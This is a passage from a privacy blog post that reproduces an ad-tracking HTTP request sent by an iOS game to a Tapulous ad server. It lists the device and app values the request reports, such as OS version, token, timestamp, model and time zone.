data-line="crayon-53c98e7aa9ac8231684692-54">54</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-56">56</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-58">58</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-60">60</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-62">62</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-64">64</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">ads</span><span class="crayon-o">/</span><span class="crayon-e">get </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">misc</span><span class="crayon-sy">.</span><span class="crayon-v">apps</span><span class="crayon-sy">.</span><span class="crayon-v">tapulous</span><span class="crayon-sy">.</span><span class="crayon-e">com</span></div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">FixitFelix_Disney</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span><span class="crayon-h"> </span><span class="crayon-i">CFNetwork</span><span class="crayon-o">/</span><span class="crayon-cn">548.1.4</span><span class="crayon-h"> </span><span class="crayon-i">Darwin</span><span class="crayon-o">/</span><span class="crayon-cn">11.0.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">1477</span></div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">multipart</span><span class="crayon-o">/</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">boundary</span><span class="crayon-o">=</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-6"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Language</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">en</span><span class="crayon-o">-</span><span class="crayon-e">us</span></div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-7"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Encoding</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">gzip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">deflate</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-8"><span class="crayon-i">Pragma</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">no</span><span class="crayon-o">-</span><span class="crayon-e">cache</span></div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-9"><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-e">alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-10"><span class="crayon-i">Proxy</span><span class="crayon-o">-</span><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-i">alive</span></div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-11">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-12"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-13"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"method"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-14">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-15"><span class="crayon-i">interstitial</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-16"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-17"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"api_sig"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-18">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-19"><span class="crayon-i">j6552Xm</span><span class="crayon-o">%</span><span class="crayon-cn">2FjGUjLYbKw3K4ha4hn</span><span class="crayon-o">%</span><span class="crayon-cn">2Bg</span><span class="crayon-o">%</span><span class="crayon-cn">3D</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-20"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-21"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"os_version"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-22">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-23"><span class="crayon-cn">5.1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-24"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-25"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"language"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-26">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-27"><span class="crayon-i">en</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-28"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-29"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"token_info"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-30">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-31"><span class="crayon-cn">50b38ddd5dff76c9c43c1f896430c4a9b907c4e445be2c9161e727f01ff836b8c53bbd53511704b35f3ac9449efb5aa6</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-32"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-33"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"timestamp"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-34">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-35"><span class="crayon-cn">1342827613</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-36"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-37"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"machine_type"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-38">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-39"><span class="crayon-i">iPad1</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-40"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-41"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"api_key"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-42">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-43"><span class="crayon-cn">11111</span><span class="crayon-o">-</span><span class="crayon-cn">22222</span><span class="crayon-o">-</span><span class="crayon-cn">33333</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-44"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-45"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"model"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-46">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-47"><span class="crayon-i">iPad</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-48"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-49"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"time_zone"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-50">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-51"><span class="crayon-i">PDT</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-52"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-53"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"app_version"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-54">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-55"><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-56"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-57"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"interstitial_type"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-58">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-59"><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-60"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-61"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"format"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-62">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9ac8231684692-63"><span class="crayon-i">plist</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ac8231684692-64"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-i">SEP</span><span class="crayon-o">--</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0149 seconds] -->
<p>This tracks these values at specific events, much like Apsalar.</p>
<ul>
<li>Method called</li>
<li>A signature</li>
<li>OS version</li>
<li>A token</li>
<li>Time stamp</li>
<li>Device version</li>
<li>API Key, but that seems to be a dummy one</li>
<li>Time Zone</li>
<li>Application version</li>
</ul>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/privacy/" title="View all posts in Privacy" rel="category tag">Privacy</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/ios/" rel="tag">iOS</a>, <a href="https://charlieeriksen.github.io/tag/privacy/" rel="tag">Privacy</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/07/21/analysis-of-ios-games-tracking-traffic/#respond" title="Comment on Analysis of iOS Games tracking traffic">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-66 -->

				
					<nav id="nav-below">
		<h2 class="assistive-text">Post navigation</h2>

		
		
						<div class="nav-previous"><a href="https://charlieeriksen.github.io/page/4/" ><span class="meta-nav">&larr;</span> Older posts</a></div>
				
						<div class="nav-next"><a href="https://charlieeriksen.github.io/page/2/" >Newer posts <span class="meta-nav">&rarr;</span></a></div>
						
		
	
	</nav><!-- #nav-below -->
	
			
			</div><!-- #content -->
		</div><!-- #primary -->

			<div id="secondary" class="widget-area" role="complementary">
			<aside id="text-2" class="widget widget_text"><h3 class="widget-title">Upcoming advisories</h3>			<div class="textwidget"><p>SA51412<br />
SA51348<br />
SA51344<br />
SA51336 </p>
</div>
		</aside><aside id="categories-4" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
	<li class="cat-item cat-item-3"><a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts filed under Advisories">Advisories</a> (32)
</li>
	<li class="cat-item cat-item-12"><a href="https://charlieeriksen.github.io/category/privacy/" title="View all posts filed under Privacy">Privacy</a> (5)
</li>
	<li class="cat-item cat-item-30"><a href="https://charlieeriksen.github.io/category/security/" title="View all posts filed under Security">Security</a> (7)
</li>
		</ul>
</aside>		<aside id="recent-posts-4" class="widget widget_recent_entries">		<h3 class="widget-title">Recent posts</h3>		<ul>
					<li>
				<a href="https://charlieeriksen.github.io/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/">Graphite remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/08/06/squash-remote-code-execution-vulnerability-advisory/">Squash remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/06/18/bsides-rhode-island-presentation-and-slides/">BSides Rhode Island presentation and slides</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/24/cve-2012-6399-or-how-your-cisco-webex-meetings-arent-very-confidential-on-ios/">CVE-2012-6399 &#8211; Or how your Cisco WebEx meetings aren&#8217;t very confidential on iOS</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/16/credit-card-numbers-third-parties-and-you/">Credit card numbers, third parties and you</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/">CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/03/conditional-csrf-or-how-to-spray-without-praying/">Conditional CSRF &#8211; Or how to spray without praying</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/">WordPress CSRF Exploit kit &#8211; A novel approach to exploiting WordPress plugins</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/03/17/amd-catalyst-driver-update-vulnerability/">AMD Catalyst driver update vulnerability</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/">WordPress Online Store local file inclusion vulnerability</a>
						</li>
				</ul>
		</aside>		</div><!-- #secondary .widget-area -->
	
	</div><!-- #main -->
	
	
	<footer id="colophon" role="contentinfo">
		<div id="site-generator">
						<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform" rel="generator">Powered by WordPress</a> &amp;	<a href="http://wpshoppe.com/" title="Minimalist WordPress Themes" rel="generator">simpleX</a>.
					
		</div>
	</footer><!-- #colophon -->
	
		
</div><!-- #page -->


</body>
</html>
<!-- Performance optimized by W3 Total Cache. Learn more: http://www.w3-edge.com/wordpress-plugins/

Page Caching using disk: enhanced

 Served from: ceriksen.com @ 2014-07-18 21:15:39 by W3 Total Cache -->